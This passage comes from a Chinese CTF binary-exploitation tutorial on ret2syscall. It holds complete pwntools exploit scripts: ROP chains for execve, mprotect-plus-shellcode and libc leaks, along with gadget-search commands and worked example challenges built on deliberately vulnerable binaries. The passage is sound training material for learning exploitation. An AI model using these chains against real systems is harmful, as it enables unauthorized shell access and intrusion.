pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]   # 必须带 ret，链才能继续滑

page = elf.bss() & ~0xfff          # 页对齐：mprotect 的硬性要求
sc   = asm(shellcraft.sh())        # 64 位 execve("/bin/sh") shellcode
assert len(sc) <= 0x100

payload  = b'A' * 0x58             # offset 用 cyclic 实测
# ============ 第 1 步：mprotect(page, 0x1000, 7)，rax=10 ============
payload += p64(pop_rdi) + p64(page)     # rdi = 对齐页地址
payload += p64(pop_rsi) + p64(0x1000)   # rsi = 长度
payload += p64(pop_rdx) + p64(7)        # rdx = RWX
payload += p64(pop_rax) + p64(10)       # rax = 10（mprotect，64 位）
payload += p64(syscall)                 # syscall; ret 继续滑链
# ============ 第 2 步：read(0, page, 0x100)，rax=0 ============
payload += p64(pop_rdi) + p64(0)        # rdi = stdin
payload += p64(pop_rsi) + p64(page)     # rsi = 目标 = 同一页
payload += p64(pop_rdx) + p64(0x100)    # rdx = 读入长度
payload += p64(pop_rax) + p64(0)        # rax = 0（read，64 位）
payload += p64(syscall)
# ============ 第 3 步：跳去 page 执行 shellcode ============
payload += p64(page)                    # read 的 syscall;ret 返回后直接落到这

p.sendlineafter(b'Input\n', payload)
p.send(sc)                              # 等链跑到 read 再发 shellcode
p.interactive()
```

### 6.4 32 位完整模板

32 位：mprotect 调用号 125、read 调用号 3，参数走 ebx/ecx/edx。特别注意 `pop edx ; pop ecx ; pop ebx` 的弹出顺序（edx 最先！）。

```python
from pwn import *
context(arch='i386', os='linux', log_level='info')

p   = process('./mpx32')
elf = ELF('./mpx32')

pop_eax = 0x080xxxxx    # pop eax ; ret
pop_3   = 0x080xxxxx    # pop edx ; pop ecx ; pop ebx ; ret
int_80  = 0x080xxxxx    # int 0x80 ; ret（中段链必须带 ret，见 6.5）

page = elf.bss() & ~0xfff
sc   = asm(shellcraft.sh())            # 32 位 shellcode

payload  = b'A' * 112
# ============ mprotect(page, 0x1000, 7)：eax=125 ============
payload += p32(pop_eax) + p32(125)
payload += p32(pop_3)
payload += p32(7)                      # 第 1 弹 -> edx = prot
payload += p32(0x1000)                 # 第 2 弹 -> ecx = len
payload += p32(page)                   # 第 3 弹 -> ebx = addr
payload += p32(int_80)
# ============ read(0, page, 0x100)：eax=3 ============
payload += p32(pop_eax) + p32(3)
payload += p32(pop_3)
payload += p32(0x100)                  # edx = len
payload += p32(page)                   # ecx = buf
payload += p32(0)                      # ebx = fd(stdin)
payload += p32(int_80)
# ============ 跳去 page ============
payload += p32(page)                   # int 0x80 返回后 ret 到 shellcode

p.sendlineafter(b'Input\n', payload)
p.send(sc)
p.interactive()
```

### 6.5 变体与提示

- **int 0x80 后面要能接上 ret**：execve 链不需要（成功即不返回），但 mprotect/read 这种中段链必须继续滑。优先搜 `int 0x80 ; ret`；搜不到就 `objdump -d` 看 int 0x80 之后的指令能否顺路滑到 ret
- 沙箱禁 execve：把 shellcode 换成 open+read+write 直接读 flag——即 ORW，详见 11 章
- 想一步拿 flag：`sc = asm(shellcraft.cat('flag'))`
- 链太长溢出空间装不下：第 8 节的接力/迁移

---

## 7. 用 write/read syscall 泄露 libc（概述）

动态链接程序的主程序里往往也有 pop rdi/rsi 等寄存器 gadget，但**没有 syscall/int 0x80**（它们在 libc 里）。此时 ret2syscall 直接打不动，改为先把 libc 的真实加载地址偷出来。思路（详细推导与完整模板在 05 章）：

1. 第一轮溢出：调 `write(1, &write@got, 8)`（走 write@plt 或 write 系统调用），把 GOT 表里 libc.write 的运行时地址打印出来
2. 本地加载同版本 libc，算基址：`libc_base = leak - libc.sym['write']`
3. 第二轮溢出：用 `system("/bin/sh")` 或 libc 里的 syscall gadget 收尾

```python
payload  = b'A' * offset
payload += p64(pop_rdi) + p64(1)                        # fd = stdout
payload += p64(pop_rsi) + p64(elf.got['write']) + p64(0)
payload += p64(pop_rdx) + p64(8)                        # 打印 8 字节
payload += p64(pop_rax) + p64(1)                        # write = 1（64 位）
payload += p64(syscall)
payload += p64(vuln)                                    # 返回溢出点，第二轮再来

leak = u64(p.recv(6).ljust(8, b'\x00'))                 # 64 位地址只有 6 字节有效
libc_base = leak - libc.symbols['write']
```

为什么链尾接 `vuln` 能再来一轮、为什么 GOT 里躺着 libc 的真实地址、如何选 libc 版本，05- ret2libc 全讲。

---

## 8. 栈空间不足时的长链问题

### 8.1 问题场景

`read(0, buf, 0x40)` 只给你 0x40 字节，而 mprotect 三段链就要 0x98+。链比空间长，怎么办？

### 8.2 三种解法

**解法一：分段 ROP（栈接力）**

把长链拆成 N 段，每段末尾 `ret` 回溢出点（main/vuln），下一轮溢出接着拼：

```python
# 第一轮：只放 mprotect 段，然后跳回 vuln 重新溢出
payload  = b'A' * offset
payload += p64(pop_rdi) + p64(page)
payload += p64(pop_rsi) + p64(0x1000)
payload += p64(pop_rdx) + p64(7)
payload += p64(pop_rax) + p64(10)
payload += p64(syscall)
payload += p64(vuln)               # 接力棒：重新跑一遍溢出函数
```

注意点：

- 每轮回到 main/vuln 的过程中寄存器会被正常流程搅动，**已设好的寄存器不保险，能当轮用完的就当轮用完**
- 每轮 main 正常 ret 平衡栈，多轮接力通常安全，但 recv/sendlineafter 时序要对齐
- 适合"每轮铺一点数据到 bss，最后一轮引爆"的打法

**解法二：返回 vuln 重新溢出（解法一的极简形态）**

每轮只放 1~2 个 gadget + 参数 + `p64(vuln)`，循环若干轮。最典型用途：先几轮把长数据（如 "/bin/sh"、指针数组）read/写进 bss，最后一轮跑主链。

**解法三：栈迁移（stack pivot，概述）**

先把**完整长链**用 read 写进 bss，再用一条迁移 gadget 把 rsp 搬过去：

- `leave ; ret`：rsp = rbp + 8，配合控制 rbp 实现"栈搬家"
- `pop rsp ; ret` / `xchg eax, esp ; ret`：直接换栈顶
- `add rsp, N ; ret`：小范围挪动，跳过栈上的数据区

之后 ROP 在宽敞的 bss 上跑，多长的链都放得下。模板与边界细节（对齐、envp 残留、二次迁移）见 **07 章**。

### 8.3 快速决策

| 剩余空间 vs 链长 | 建议 |
|:---|:---|
| 装得下 | 直接打 |
| 差一点点 | 精简 gadget（合并 pop、复用寄存器残留值） |
| 明显不够 | 分段接力 / 回 vuln 重溢 |
| 链极长、需要反复 | 栈迁移到 bss |

---
## 9. 变体与扩展

### 9.1 execve 参数细节

- `execve("/bin/sh", 0, 0)`：Linux 完全接受 argv/envp 为 NULL，是 CTF 标准打法
- 个别题（检查 argv 内容、或要带参数执行）需要真传指针数组：先用写内存 gadget 在 bss 摆好 `{ptr_path, ptr_arg, NULL}`，再让 rsi（32 位为 ecx）指向它——注意 64 位一个指针占 8 字节
- 想一步执行命令而非交互 shell：`execve("/bin/sh", ["/bin/sh", "-c", "cat flag"], 0)`，需要摆 3 个指针的数组
- execve **成功不返回**（链尾不用补 exit）；失败才返回 -errno，程序继续往下跑
- 被字符串过滤挡住时：改走系统调用号（本章全部打法本来就是 syscall），或用 execveat；路径也可以用 "/bin//sh"、"//bin/sh" 等变体绕简单过滤

### 9.2 syscall 之后保持栈平衡

- `syscall ; ret` 天然平衡，滑链继续
- 裸 `syscall` 之后的指令不受控：要么确认无副作用，要么把链设计成"syscall 即终点"
- 64 位 syscall 会改写 **rcx（返回地址）与 r11（rflags）**：链后面还要用这两个寄存器就必须重新 pop
- int 0x80 的返回值在 eax，其余寄存器基本原样保留
- **每次系统调用的返回值都落在 rax/eax**：read 返回读到的字节数、write 返回写出的字节数。链上接着要用 rax 放下一个调用号时必须重新 pop，绝不能想当然
- syscall 链本身不检查栈对齐（对齐问题只影响函数调用里的 movaps 崩溃），但链里混用函数调用（如 ret2plt）时要留意 16 字节对齐

### 9.3 静态程序找不到 int 0x80 / syscall 去哪找

按顺序排查：

1. **加大深度**：`ROPgadget --binary ./pwn --depth 20 --only "int|ret"`。int 0x80 前后常夹着 push/pop 等指令，默认深度可能把它切碎搜不出来
2. **换 ropper**：解码器不同，经常互补搜出
3. **objdump 人工确认**：`objdump -d ./pwn | grep -B3 -A3 "int.*0x80"`——静态程序的 syscall 包装函数（write/execve/mprotect 的实现）里必有 int 0x80，把它前后的指令整体看成一个 gadget 用
4. 64 位静态程序 syscall 满天飞：`ROPgadget --binary ./pwn --only "syscall|ret"`
5. 动态链接题：主程序里没有，就去 **libc.so.6** 里搜（需要先 leak 基址，05 章）
6. 极少数裁剪静态程序真的没有：转 ret2libc / ret2csu 调函数路线

另外：vdso/vsyscall 页里虽有 syscall/int 0x80，但其地址受 ASLR 影响不固定，除非能 leak，否则别依赖。

### 9.4 动态链接程序中的 ret2syscall

- 主程序（非 libc 部分）通常仍有 `pop rdi ; ret` 这类通用 gadget，但 **int 0x80 / syscall 几乎必然没有**
- 两条出路：
  - **先 leak 后 syscall**：用主程序 gadget 调 write@plt 泄露 libc 基址，第二轮用 libc 里的 `syscall ; ret` 与 "/bin/sh"（05 章主线）
  - **干脆 ret2libc**：`system("/bin/sh")` 不需要 syscall gadget，更简单（05 章）
- one_gadget：在 libc 里找一条 `execve("/bin/sh", ...)` 的完整现成链，只需满足少量寄存器约束（07 章）

### 9.5 其他系统调用玩法

- ORW 读 flag：open+read+write / openat+sendfile，11 章主线
- `chdir` + 相对路径 open/execve 绕路径过滤（见 5.3）
- `dup2` 在网络服务题里把 socket 接到 stdin/stdout
- `sigreturn`（SROP）：rax=15 时 sigreturn 会用栈上构造的 sigcontext 一口气恢复全部寄存器，一步设齐 rax/rdi/rsi/rdx，07 章进阶

---

## 10. 典型例题

### 例题 1：32 位静态经典 ret2syscall

**程序特征（伪 C）**：

```c
// gcc -m32 -static -no-pie -fno-stack-protector ret2syscall.c -o ret2syscall
#include <unistd.h>
int main() {
    char buf[100];
    write(1, "Input\n", 6);
    read(0, buf, 0x120);      // buf 远小于读入量 => 可溢出约 0xb0 字节
    return 0;                 // 无后门、无 system，纯靠系统调用
}
```

**checksec**：

```text
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled          <- 栈不可执行，排除 ret2shellcode
    PIE:      No PIE (0x8048000)  <- 地址全部固定
    （静态链接）                   <- gadget 与 int 0x80 全在主程序里
```

特征组合"静态 + NX + 无 canary + 无 PIE" = 教科书 ret2syscall 场景。

**gadget 清单及查找命令**：

```bash
$ ROPgadget --binary ret2syscall --only "pop|ret" | grep -E ": pop (eax|edx|ecx|ebx)"
0x080bb196 : pop eax ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
$ ROPgadget --binary ret2syscall --only "int"
0x08049421 : int 0x80
$ ROPgadget --binary ret2syscall --string "/bin/sh"
[+] Gadget found: 0x080be408 : "/bin/sh"
$ python3 -c "from pwn import *; print(cyclic_find(0x61616168))"    # offset = 112
```

**思路**：eax=11、ebx=&"/bin/sh"、ecx=edx=0、int 0x80。栈图见 3.2，完全一致。

**exp**：

```python
from pwn import *
context(arch='i386', os='linux', log_level='info')

p   = process('./ret2syscall')
elf = ELF('./ret2syscall')

payload = flat(
    b'A' * 112,                          # 填充到 saved EIP（cyclic 实测）
    0x080bb196,                          # pop eax ; ret
    0xb,                                 # eax = 11 = execve（32 位调用号）
    0x0806eb90,                          # pop edx ; pop ecx ; pop ebx ; ret
    0, 0,                                # 依次弹给 edx(envp)、ecx(argv)
    next(elf.search(b'/bin/sh\x00')),    # 弹给 ebx = pathname
    0x08049421,                          # int 0x80 => getshell
)

p.sendlineafter(b'Input\n', payload)
p.interactive()
```

**变体练习**：把 read 换成 gets（无长度限制）；删掉 "/bin/sh"（练 5.1/5.2）；删掉三连 pop（练 3.3 的独立 pop 模板）。

### 例题 2：64 位 pop 链 + syscall

**程序特征（伪 C）**：

```c
// gcc -static -no-pie -fno-stack-protector x64.c -o x64
#include <unistd.h>
int main() {
    char buf[0x60];
    write(1, ">> ", 3);
    read(0, buf, 0x100);      // 溢出约 0xa0 字节
    return 0;
}
```

**checksec**：

```text
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

**gadget 清单及查找命令**：

```bash
$ ROPgadget --binary x64 --only "pop|ret" | grep -E ": pop (rdi|rsi|rdx|rax)"
0x000000000040173f : pop rdi ; ret
0x000000000040173d : pop rsi ; pop r15 ; ret
0x0000000000401741 : pop rdx ; ret            # 若没有 -> 4.3 csu 链
0x0000000000402d1c : pop rax ; ret
$ ROPgadget --binary x64 --only "syscall|ret"
0x00000000004017a2 : syscall ; ret
$ ROPgadget --binary x64 --string "/bin/sh"
[+] Gadget found: 0x00000000004a3b20 : "/bin/sh"
```

**思路**：标准五段链（4.1 栈图）：rdi=binsh、rsi=0、rdx=0、rax=59、syscall。offset 用 cyclic 实测为 104（buf 0x60 + saved rbp 8）。

**exp**：

```python
from pwn import *
context(arch='amd64', os='linux', log_level='info')

p   = process('./x64')
elf = ELF('./x64')

POP_RDI = 0x40173f                 # pop rdi ; ret
POP_RSI = 0x40173d                 # pop rsi ; pop r15 ; ret
POP_RDX = 0x401741                 # pop rdx ; ret
POP_RAX = 0x402d1c                 # pop rax ; ret
SYSCALL = 0x4017a2                 # syscall ; ret
BINSH   = next(elf.search(b'/bin/sh\x00'))

payload  = b'A' * 104              # 填到 saved RIP
payload += p64(POP_RDI) + p64(BINSH)          # rdi = "/bin/sh"
payload += p64(POP_RSI) + p64(0) + p64(0)     # rsi = 0；r15 吃一个填充
payload += p64(POP_RDX) + p64(0)              # rdx = 0
payload += p64(POP_RAX) + p64(59)             # rax = execve
payload += p64(SYSCALL)                       # 开炮

p.sendlineafter(b'>> ', payload)
p.interactive()
```

**变体练习**：删掉 pop rdx（改 csu 链）；删掉 "/bin/sh"（改 5.2 read 读入法）。

### 例题 3：mprotect + shellcode 静态题

**程序特征（伪 C，64 位）**：

```c
// gcc -static -no-pie -fno-stack-protector mpx.c -o mpx
#include <unistd.h>
int main() {
    char buf[0x40];
    write(1, "Input\n", 6);
    read(0, buf, 0x200);      // 溢出空间充足，够放三段链
    return 0;
}
```

**checksec**：

```text
    Arch:     amd64-64-little
    NX:       NX enabled            <- 栈/bss 默认不可执行
    Stack:    No canary found
    PIE:      No PIE (0x400000)
```

**gadget 清单及查找命令**：

```bash
$ ROPgadget --binary mpx --only "pop|ret" | grep -E ": pop (rdi|rsi|rdx|rax)"
0x0000000000401732 : pop rdi ; ret
0x0000000000401730 : pop rsi ; pop r15 ; ret
0x0000000000401734 : pop rdx ; ret
0x0000000000402cab : pop rax ; ret
$ ROPgadget --binary mpx --only "syscall|ret"
0x0000000000401795 : syscall ; ret
$ python3 -c "from pwn import *; e=ELF('./mpx'); print(hex(e.bss() & ~0xfff))"
0x4b9000
```

**思路**：6.1 三段链——mprotect(bss 页, 0x1000, 7) 改权限；read(0, bss 页, 0x100) 读入 shellcode；ret 到 bss 页执行。全链约 19 格（0x98 字节），0x200 的读入量装得下；若题目只给 0xC0 就要去第 8 节接力/迁移。

**exp**：

```python
from pwn import *
context(arch='amd64', os='linux', log_level='info')

p   = process('./mpx')
elf = ELF('./mpx')
rop = ROP(elf)

POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
POP_RDX = rop.find_gadget(['pop rdx', 'ret'])[0]
POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
SYSCALL = rop.find_gadget(['syscall', 'ret'])[0]

page = elf.bss() & ~0xfff          # 页对齐
sc   = asm(shellcraft.sh())
assert len(sc) < 0x100

payload  = b'A' * 0x48             # offset = buf 0x40 + saved rbp 8（cyclic 实测）
# ---- 1) mprotect(page, 0x1000, 7)：rax=10 ----
payload += p64(POP_RDI) + p64(page)
payload += p64(POP_RSI) + p64(0x1000)
payload += p64(POP_RDX) + p64(7)
payload += p64(POP_RAX) + p64(10)
payload += p64(SYSCALL)
# ---- 2) read(0, page, 0x100)：rax=0 ----
payload += p64(POP_RDI) + p64(0)
payload += p64(POP_RSI) + p64(page)
payload += p64(POP_RDX) + p64(0x100)
payload += p64(POP_RAX) + p64(0)
payload += p64(SYSCALL)
# ---- 3) ret 到 page ----
payload += p64(page)

p.sendlineafter(b'Input\n', payload)
p.send(sc)                         # 链卡在 read 时送入 shellcode
p.interactive()
```

**易错点**：

- page 没对齐 => mprotect 静默返回 EINVAL，链继续跑，read 写进不可执行页，最后跳过去就崩
- shellcode 发早了（第一次 sendline 就捎上）会被当成 ROP 数据吃掉，两次发送必须分开
- 32 位版本只换调用号（mprotect=125、read=3）与 ebx/ecx/edx 传参，模板见 6.4

---

## 11. 常见坑

**11.1 gadget 搜索的 --depth 参数**

ROPgadget 默认深度 10 条指令，绝大多数 gadget 够用；但 csu 的 6 连 pop、int 0x80 夹在压栈指令中间等情况会漏。搜不到先 `--depth 15/20`，再用 ropper 交叉验证。深度过大也会带出一堆"中间指令有副作用"的垃圾 gadget，别无脑照抄。

**11.2 寄存器顺序记反**

- 32 位系统调用参数：**ebx → ecx → edx**（不是 edx 开头！）
- `pop edx ; pop ecx ; pop ebx ; ret` 的取值顺序 = 弹出顺序：edx 最先弹，所以栈上 edx 的值紧跟 gadget 地址
- 64 位：rdi → rsi → rdx；`pop rsi ; pop r15 ; ret` 记得多垫一个值
- 自查方法：把链画成 3.2 那样的栈图，一格一格对

**11.3 调用号位数与 rax 高位残留**

- 两套调用号背混是第一大坑：read 3/0、write 4/1、open 5/2、execve 11/59、mprotect 125/10
- 64 位下 `pop rax`（弹满 64 位）最稳；找不到时用 `pop eax`/`mov eax, X` 也行——**写 32 位寄存器会把高 32 位零扩展清零**，放小调用号没问题
- 真正的高位残留陷阱：用 `add eax, 1`、`inc eax` 这类"从现有值凑调用号"的 gadget，若 rax 原值高 32 位非零，`add eax` 只改低 32 位，syscall 时 rax 是个巨大数字 => ENOSYS。拿不准就重新完整 pop rax
- read/write 的返回值（字节数）会留在 rax，后续再用 rax 前必须重设

**11.4 int 0x80 与 syscall 混用**

- `syscall` 指令只在 64 位模式有定义，32 位程序里搜到同名字节纯属巧合，不能用
- 64 位程序即使残留 int 0x80 字节也别用——32 位调用号表 + ebx/ecx/edx 传参在 64 位内核下语义完全不同
- 动手前 `file ./pwn` / `checksec` 先确认位数，gadget 按位数搜

**11.5 找的 gadget 在非可执行段**

- ROPgadget/ropper 默认只扫可执行段，一般不会坑你；**手抄 writeup 地址、把字符串地址当 gadget、PIE 题按非 PIE 地址打**才会
- 自查：`readelf -lW ./pwn` 看 LOAD 段的 RWE 标志，gadget 地址必须落在可执行（E）段
- PIE 开启时所有 gadget 地址 = 基址 + 偏移，必须先 leak 基址（或改打 ret2plt 泄露）

**11.6 时序类杂坑**

- 中段 read 链（5.2/6）的数据要等链跑到 read 再发，sendlineafter/recvuntil 对齐；多发一个换行都可能被当作 read 的多余字节
- 静态程序的 .bss 里可能被运行时数据占用，写 "/bin/sh" 选偏远角落（如 `elf.bss(0x800)`）并确认该地址确实可写

---

## 12. 本章检查清单

- [ ] 能向别人讲清 ret 滑链：rsp 如何移动、参数为什么紧跟 gadget
- [ ] 默写调用号表：read/write/open/execve/mprotect 的 32 位与 64 位值
- [ ] 熟练使用 ROPgadget（--only/--depth/--string）与 ropper（--search），知道两者互补
- [ ] 独立完成 32 位 execve 链，并说清 `pop edx ; pop ecx ; pop ebx` 的弹出顺序
- [ ] 独立完成 64 位 execve 链，处理过 `pop rsi ; pop r15` 的填充位
- [ ] 实操过至少一种"没有 /bin/sh"的解法（写内存 / read 读入 / chdir+短串）
- [ ] 能默写 mprotect+read+shellcode 三段链（64 位），并说清页对齐要求
- [ ] 知道 syscall 破坏 rcx/r11、read 返回值占用 rax 这两个"链后重设"要点
- [ ] 栈空间不足时知道三条路：精简 gadget / 分段接力 / 栈迁移
- [ ] 对照第 11 节自查过全部 6 类坑

## 相关阅读

- [03-ret2shellcode.md](03-ret2shellcode.md) —— shellcode 与 shellcraft 写法，mprotect 法的最后一步要用它
- [05-ret2libc.md](05-ret2libc.md) —— 动态链接场景的标准解法：leak GOT、算基址、system("/bin/sh")
- [07-ROP高级技巧.md](07-ROP高级技巧.md) —— ret2csu 两段式详解、栈迁移模板、SROP、one_gadget
- [99-C语言函数手册.md](99-C语言函数手册.md) —— execve/mprotect/read/write 等函数的精确语义
- 返回总览：[README.md](README.md)
